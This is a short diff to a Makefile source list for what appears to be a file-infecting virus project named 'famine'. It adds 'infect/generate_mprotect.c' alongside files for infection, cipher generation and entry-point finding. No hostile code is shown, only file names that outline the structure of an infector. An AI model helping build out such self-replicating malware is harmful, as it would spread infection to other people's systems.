@@ -19,6 +19,7 @@ SRC =	famine.s                      \
 	infect/file_iterator.c        \
 	infect/find_entry.c           \
 	infect/generate_cypher.c      \
+	infect/generate_mprotect.c    \
 	infect/can_infect.c           \
 	infect/infect.c               \
 	infect/iterators.c            \
